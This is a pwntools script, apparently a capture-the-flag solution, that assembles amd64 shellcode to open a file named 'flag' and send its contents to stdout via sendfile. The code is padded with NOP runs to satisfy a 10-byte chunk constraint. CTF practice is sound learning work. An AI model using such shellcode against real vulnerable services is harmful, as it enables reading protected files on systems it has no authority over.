from pwn import *

context.arch = 'amd64'
"""
sc = asm(shellcraft.cat('flag'))

copy shellcode of this, but only fill 10 bytes nop every 10 bytes

NOTE: also need to change cwd to /
"""

sc = asm('''
push 0x67616c66
push 0x2                        /* 7 bytes */
jmp next1                      /* 9 bytes */

.rept 11
  nop
.endr

next1:
pop rax
mov rdi, rsp
xor esi, esi
syscall
jmp next2                       /* 10 bytes */

.rept 10
  nop
.endr

next2:
mov r10d, 0x7fffffff            /* 6 bytes */
jmp next3                       /* 8 bytes */

.rept 12
  nop
.endr

next3:
mov rsi, rax
push 0x28
pop rax
push 0x1
jmp next4                       /* 10 bytes */

.rept 10
  nop
.endr

next4:
pop rdi
cdq
syscall
''')

print(disasm(sc))
